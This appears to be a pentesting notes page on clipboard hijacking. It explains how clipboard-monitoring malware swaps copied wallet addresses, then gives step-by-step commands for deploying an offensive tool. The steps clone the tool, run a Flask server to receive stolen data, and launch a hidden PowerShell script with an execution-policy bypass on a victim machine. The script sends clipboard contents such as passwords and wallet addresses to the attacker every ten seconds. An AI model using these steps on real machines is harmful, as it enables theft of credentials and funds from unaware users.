# 📋 Clipboard Hijacking (Post)

## Introduction

Clipboard hijacking is a type of cyberattack where malicious software takes control of a device’s clipboard (the temporary storage location where copied data is held) and alters its contents. This attack is particularly common in phishing scams and cryptocurrency theft, where users copy sensitive information, such as bank account numbers or cryptocurrency wallet addresses, to paste them elsewhere. When clipboard hijacking occurs, the malicious software replaces the copied information with something the attacker controls, often leading the victim to unknowingly send money or sensitive data to the attacker.

**Here’s how clipboard hijacking typically works:**

1. **Malware Infection**: A device is infected with malware designed to monitor the clipboard.
2. **Clipboard Monitoring**: The malware continuously monitors clipboard activity for specific patterns, like long strings that resemble cryptocurrency addresses.
3. **Replacement of Clipboard Data**: When a targeted pattern is detected, the malware replaces the copied text with data provided by the attacker, such as a cryptocurrency wallet address they control.
4. **Unintended Transaction**: The victim pastes this malicious data, completing the transaction to the attacker's benefit without realizing the change.



***

## Clipboard Hijacking Practical

### Objective

The Clipboard Hijacker Payload is a simple post exploitation method for pentesting purpose. Clipboard-Hijacker Payload aims to monitor, capture, and potentially manipulate clipboard data on a target machine. This data is often used to store sensitive information like passwords, cryptocurrency wallet addresses, credit card details, or other data users copy and paste during normal activities. The payload could also modify clipboard contents to redirect actions like payments or logins to attacker-controlled entities.

This payload automatically send the captured clipboard data to your web server or webhook in every 10 seconds.

### Attacker Machine

#### Clone the Github Repo

```
git clone https://github.com/techchipnet/Clipboard-Hijacker.git
```

#### Run Flask webserver in your attacker machine using python so you need to install flask.

```
python3 -m pip install flask
```

#### Now you can run the following command for run the server

```
python3 server.py
```

{% hint style="info" %}
change your webserver's IP address in clipboardhijacker.ps1 file & run this script using following command or other method like USB rubber ducky, metasploit command execution etc.
{% endhint %}



### Victim Machine

```
powershell -NoP -NonI -W h -Exec Bypass .\clipboardhijacker.ps1
```

{% hint style="info" %}
After that your webserver will getting target machine clipboard data in every 10 sec.
{% endhint %}





***

## REFERENCES

* [https://github.com/techchipnet/Clipboard-Hijacker](https://github.com/techchipnet/Clipboard-Hijacker)
* [https://www.youtube.com/watch?v=WylviCWbz9M\&ab\_channel=TechChip](https://www.youtube.com/watch?v=WylviCWbz9M\&ab\_channel=TechChip)



